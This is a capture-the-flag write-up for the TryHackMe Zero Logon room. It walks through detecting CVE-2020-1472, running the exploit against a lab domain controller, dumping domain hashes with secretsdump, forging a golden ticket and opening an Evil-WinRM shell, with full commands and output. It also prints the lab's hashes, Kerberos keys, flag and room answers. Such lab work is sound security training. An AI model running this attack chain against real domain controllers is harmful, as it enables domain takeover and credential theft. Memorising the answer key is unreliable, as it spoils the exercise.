---
render_with_liquid: false
title: Zero Logon
tags: [tryhackme, zero-logon, cve-2020-1472, crackmapexec, ntpdate, impacket, powerview, evil-winrm, dcsync, ad]
---



> https://tryhackme.com/room/zer0logon


## Identify zero logon exploit

```bash
┌──(kali㉿kali)-[~]
└─$ cme smb 10.10.244.21 -u '' -p '' -M zerologon
SMB         10.10.244.21    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:hololive.local) (signing:True) (SMBv1:False)
SMB         10.10.244.21    445    DC01             [+] hololive.local\:
SMB         10.10.244.21    445    DC01             [-] Neo4J does not seem to be available on bolt://127.0.0.1:7687.
ZEROLOGO... 10.10.244.21    445    DC01             VULNERABLE
ZEROLOGO... 10.10.244.21    445    DC01             Next step: https://github.com/dirkjanm/CVE-2020-1472
```


## Add gathered hostnames to hosts

```bash
echo '10.10.244.21 hololive.local DC01.hololive.local' | sudo tee -a /etc/hosts
```


## Sync time with DC

```bash
sudo ntpdate hololive.local
```


## Exploit Zero Logon (CVE-2020-1472)


### Exploit steps

1. Read the blog/whitepaper above so you know what you're doing
2. Run cve-2020-1472-exploit.py with IP and netbios name of DC
3. DCSync with secretsdump, using -just-dc and -no-pass or empty hashes and the DCHOSTNAME$ account


### Run the exploit

```bash
git clone https://github.com/dirkjanm/CVE-2020-1472
cd CVE-2020-1472
```

```bash
┌──(kali㉿kali)-[/opt/sectools/CVE/CVE-2020-1472]
└─$ python cve-2020-1472-exploit.py DC01 10.10.244.21
Performing authentication attempts...
===========================================================================================================================================================================================================================================================================================================================================================================================================================================
Target vulnerable, changing account password to empty string

Result: 0

Exploit complete!
```


## DCSync

```bash
┌──(kali㉿kali)-[~]
└─$ secretsdump.py hololive.local/'DC01$'@10.10.244.21 -no-pass -just-dc
Impacket v0.10.1.dev1+20230718.100545.fdbd256 - Copyright 2022 Fortra

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3f3ef89114fb063e3d7fc23c20f65568:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2179ebfa86eb0e3cbab2bd58f2c946f5:::
hololive.local\a-koronei:1104:aad3b435b51404eeaad3b435b51404ee:efc17383ce0d04ec905371372617f954:::
hololive.local\a-fubukis:1106:aad3b435b51404eeaad3b435b51404ee:2c90bc6c1c35b71f455f3d08cf4947bd:::
hololive.local\matsurin:1107:aad3b435b51404eeaad3b435b51404ee:a4c59da4140ebd8c59410370c687ef51:::
hololive.local\fubukis:1108:aad3b435b51404eeaad3b435b51404ee:f78bb88e1168abfa165c558e97da9fd4:::
hololive.local\koronei:1109:aad3b435b51404eeaad3b435b51404ee:efc17383ce0d04ec905371372617f954:::
hololive.local\okayun:1110:aad3b435b51404eeaad3b435b51404ee:a170447f161e5c11441600f0a1b4d93f:::
hololive.local\watamet:1115:aad3b435b51404eeaad3b435b51404ee:50f91788ee209b13ca14e54af199a914:::
hololive.local\mikos:1116:aad3b435b51404eeaad3b435b51404ee:74520070d63d3e2d2bf58da95de0086c:::
DC01$:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:3415e858d1caff75baeb02c4dd7154328ea6c87f07336a5c926014392a40ed49
Administrator:aes128-cts-hmac-sha1-96:535501623337ae03580527692f08f0e1
Administrator:des-cbc-md5:bf34685d383e6734
krbtgt:aes256-cts-hmac-sha1-96:9702af2b67c5497940d0f0a7237fbd53d18fb2923fadd37f4ba33d6d5dab4583
krbtgt:aes128-cts-hmac-sha1-96:81628713bd5608becc4325052eb9702d
krbtgt:des-cbc-md5:25f1cea1542f9e31
...
```


## Craft golden ticket

Get domain sid first

```bash
┌──(kali㉿kali)-[~]
└─$ lookupsid.py hololive.local/'DC01$'@10.10.244.21 -no-pass
Impacket v0.10.1.dev1+20230718.100545.fdbd256 - Copyright 2022 Fortra

[*] Brute forcing SIDs at 10.10.244.21
[*] StringBinding ncacn_np:10.10.244.21[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1872501866-1970410005-2298688736
...
```

```bash
┌──(kali㉿kali)-[~]
└─$ ticketer.py -aesKey 9702af2b67c5497940d0f0a7237fbd53d18fb2923fadd37f4ba33d6d5dab4583 -domain-sid S-1-5-21-1872501866-1970410005-2298688736 -domain hololive.local Administrator
Impacket v0.10.1.dev1+20230718.100545.fdbd256 - Copyright 2022 Fortra

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for hololive.local/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncASRepPart
[*] Saving ticket in Administrator.ccache
```


## Pass The Ticket with evil-winrm


### Reset the machine password

> Zero Logon will break kerberos authentication , it will show the error message : `STATUS_MORE_PROCESSING_REQUIRED({Still Busy} The specified I/O request packet (IRP) cannot be disposed of because the I/O operation is not complete.)` 
> 
> Reset the machine account password to make kerberos authentication work again
{: .prompt-warning }

issue the following command to reset the machine back to it's original state:

```bash
wmiexec.py -hashes 0:3f3ef89114fb063e3d7fc23c20f65568 -shell-type powershell Administrator@dc01.hololive.local 'Reset-ComputerMachinePassword'
```


### Configure Kerberos

Configure `krb5.conf`

>Template of `/etc/krb5.conf` 

```config
[libdefaults]
        default_realm = HOLOLIVE.LOCAL

[realms]
        HOLOLIVE.LOCAL = {
                kdc = DC01.HOLOLIVE.LOCAL
        }

[domain_realm]
        .hololive.local = HOLOLIVE.LOCAL
```


### Evil-Winrm

Set `KRB5CCNAME` cache variable

```bash
export KRB5CCNAME=Administrator.ccache
```

Verify that the ticket works

```bash
┌──(kali㉿kali)-[~]
└─$ cme winrm DC01.hololive.local --use-kcache
SMB         HOLOLIVE.LOCAL  5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:hololive.local)
HTTP        HOLOLIVE.LOCAL  5985   DC01             [*] http://HOLOLIVE.LOCAL:5985/wsman
```

Start evil-winrm

```bash
┌──(kali㉿kali)-[~]
└─$ evil-winrm -r hololive.local -i DC01.hololive.local

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ../Desktop/root.txt
THM{Zer0Log0nD4rkTh1rty}
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```


## Questions


### What is the NetBIOS name of the Domain Controller?

> DC01


### What is the NetBIOS domain name of the network?

> HOLOLIVE


### What domain are you attacking?

> hololive.local


### What is the Local Administrator's NTLM hash?

> 3f3ef89114fb063e3d7fc23c20f65568


### How many Domain Admin accounts are there?

```bash
powerview -k hololive.local/Administrator@DC01.hololive.local --no-pass -q "Get-NetGroup 'Domain Admins'"
```

![](/assets/obsidian/dc22aed69e5ede18a0762166f1a64e14.png)

> 2


### What is the root flag?

> THM{Zer0Log0nD4rkTh1rty}